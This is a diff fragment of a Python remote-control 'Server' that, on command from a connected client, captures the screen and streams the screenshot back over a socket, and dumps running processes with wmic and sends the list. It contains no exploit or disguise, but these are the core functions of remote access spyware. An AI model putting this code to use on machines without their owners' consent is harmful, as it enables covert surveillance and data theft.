@@ -76,7 +76,7 @@ class Server(object):
             #Commands the server to capture its screen and send the screenshot back to the client
             pyautogui.screenshot().save('scr.png')
             with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as u:
-                u.connect((self.target_addr[0], 1026))
+                u.connect((self.target_addr[0], 1025))
                 with open('scr.png', 'rb') as send:
                     while True:
                         data = send.read(1024)
@@ -86,15 +86,26 @@ class Server(object):
         elif Str.decode() == 'SHWPRC':
             print(Str.decode())
             #Commands the server to send the file consisting of running processes
-            os.system("tasklist>list.txt")
+            os.system("wmic process get Name, ProcessId, ThreadCount >list.txt")
+            send = open('list.txt', 'r')
+            while True:
+                data = send.readline()
+                print(data)
+                if not data:
+                    self.conn.send('STOPRIGHTNOW'.encode())
+                    break
+                self.conn.sendall(data.strip().encode())
+            
+            '''
             with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as u:
-                u.connect((self.target_addr[0], 1026))
+                u.connect((self.target_addr[0], 1025))
                 with open('list.txt', 'r') as send:
                     while True:
                         data = send.read(1024)
                         if not data:
                             break
                         u.sendall(data.encode())
+            '''
         elif Str.decode().find('GETVALUE')!=-1:
             print(Str.decode())
             arr = Str.decode().split(' ')
